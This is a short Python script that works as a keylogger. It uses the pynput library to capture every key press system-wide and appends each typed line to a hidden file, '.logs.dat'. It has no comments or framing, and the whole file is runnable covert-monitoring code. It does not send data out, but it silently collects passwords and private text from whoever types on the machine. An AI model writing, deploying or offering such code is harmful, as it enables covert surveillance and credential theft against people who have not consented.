from pynput import keyboard

FILE = ".logs.dat"
BUFFER = ""

def write(Buf):
    try:
        with open(FILE, 'a') as File_Obj:
            File_Obj.write(Buf + '\n')
    except Exception as Error:
        print(f"Error writing to file: {Error}")

def pressed(Key):
    global BUFFER
    try:
        if Key == keyboard.Key.space:
            BUFFER += " "
        elif Key == keyboard.Key.enter:
            write(BUFFER)
            BUFFER = ""
        elif hasattr(Key, 'char'):
            BUFFER += Key.char
        else:
            BUFFER += f"<{Key.name}>"
    except AttributeError:
        
        BUFFER += f"<{Key}>"

def main():
    try:
        with keyboard.Listener(on_press=pressed) as listener:
            listener.join()
    except KeyboardInterrupt:
        if BUFFER:
            write(BUFFER)
        exit()

if __name__ == "__main__":
    main()
